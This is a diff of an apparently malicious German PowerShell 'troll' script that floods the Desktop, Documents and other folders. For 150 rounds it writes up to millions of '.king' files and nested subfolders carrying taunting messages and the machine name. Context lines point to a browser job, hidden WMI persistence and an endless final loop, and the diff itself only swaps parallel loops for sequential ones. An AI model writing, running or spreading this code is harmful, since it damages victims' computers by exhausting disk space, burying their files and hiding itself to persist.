@@ -54,15 +54,6 @@ $global:trollActive = $true
 $global:currentRound = 0
 $global:maxRounds = 150
 
-# ===== PERFORMANCE-TUNING =====
-$PSDefaultParameterValues['*:Encoding'] = 'ascii'  # ASCII ist VIEL schneller!
-$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
-[System.IO.Directory]::SetCurrentDirectory($env:TEMP)
-
-# MAXIMALE PARALLELISIERUNG
-$maximumThreads = [Environment]::ProcessorCount * 4
-if ($maximumThreads -lt 8) { $maximumThreads = 8 }
-
 # ALLE ZIELE FÜR DATEIEN/ORDNER
 $desktop = [Environment]::GetFolderPath("Desktop")
 $documents = [Environment]::GetFolderPath("MyDocuments")
@@ -219,65 +210,42 @@ $browserJob = Start-Job -ScriptBlock {
     }
 }
 
-# ===== OPTIMIERTE HAUPTSCHLEIFE - EXTRA SCHNELL =====
+# ===== HAUPTSCHLEIFE =====
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
     
-    # PARALLELE VERARBEITUNG FÜR EXTREMEN SPAM!
-    $alleZiele | ForEach-Object -Parallel {
-        $ziel = $_
-        $round = $using:global:currentRound
-        
+    # JEDES ZIEL IN DER LISTE BEARBEITEN!
+    foreach ($ziel in $alleZiele) {
         if (Test-Path $ziel) {
-            # HAUPTORDNER SCHNELL ERSTELLEN
-            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$round"
+            # Hauptordner erstellen
+            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
             try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
             
-            # MASZENSPAM - ALLES AUF EINMAL!
-            
-            # 2000 DATEIEN PRO ZIEL (statt 1000)
-            $dateiBlock = 1..2000 | ForEach-Object {
-                $i = $_
-                # DIREKT IM ZIEL
-                $pfad1 = Join-Path $ziel "MAIN2PACKET_SCAN_$i.king"
-                # IM HAUPTORDNER
-                $pfad2 = Join-Path $mainFolder "file_$i.king"
+            # 500 DATEIEN PRO ZIEL
+            for ($i = 1; $i -le 1000; $i++) {
+                # Direkt im Zielordner
+                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DASS WAR MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
                 
-                # BEIDE DATEIEN AUF EINMAL
-                @(
-                    @{Path=$pfad1; Content="MAIN2PACKET IST ÜBERALL $env:COMPUTERNAME $i"}
-                    @{Path=$pfad2; Content="MAIN2PACKET KING $env:COMPUTERNAME $i"}
-                )
+                # Im Hauptordner
+                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DAS WARS MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
             }
             
-            # ALLE DATEIEN BLITZSCHNELL SCHREIBEN
-            $dateiBlock | ForEach-Object {
-                $_.Content | Out-File $_.Path -Encoding UTF8 -Force
-            }
-            
-            # 2000 UNTERORDNER (statt 1000)
-            $unterordner = 1..2000 | ForEach-Object {
-                Join-Path $mainFolder "SUB_$_"
-            }
-            
-            # ALLE UNTERORDNER AUF EINMAL ERSTELLEN
-            $unterordner | ForEach-Object {
-                New-Item -Path $_ -ItemType Directory -Force | Out-Null
-            }
-            
-            # 2000 DATEIEN PRO UNTERORDNER (statt 500)
-            foreach ($sub in $unterordner) {
-                $subName = [System.IO.Path]::GetFileName($sub)
-                1..2000 | ForEach-Object {
-                    $subFile = Join-Path $sub "subfile_$_.king"
-                    "SUB $subName - DATEI $_" | Out-File $subFile -Encoding UTF8 -Force
+            # 500 UNTERORDNER
+            for ($u = 1; $u -le 1000; $u++) {
+                $subFolder = Join-Path $mainFolder "SUB_$u"
+                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
+                
+                # 500 DATEIEN PRO UNTERORDNER
+                for ($s = 1; $s -le 1000; $s++) {
+                    $subFile = Join-Path $subFolder "subfile_$s.king"
+                    "SUB-ORDNER $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
                 }
             }
         }
-    } -ThrottleLimit 10  # 10 PARALLELE JOBS GLEICHZEITIG!
+    }
     
-    # KEINE PAUSE MEHR - MAXIMALER SPAM!
-    # Start-Sleep -Seconds 0  <-- ENTFERNT!
+    # KURZE PAUSE ZWISCHEN RUNDEN
+    Start-Sleep -Seconds 1
 }
 
 # ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
@@ -307,5 +275,3 @@ $wmiJob = Start-Job -ScriptBlock {
 
 # ===== ENDE - LÄUFT WEITER =====
 while ($true) {
-    Start-Sleep -Seconds 3600
-}
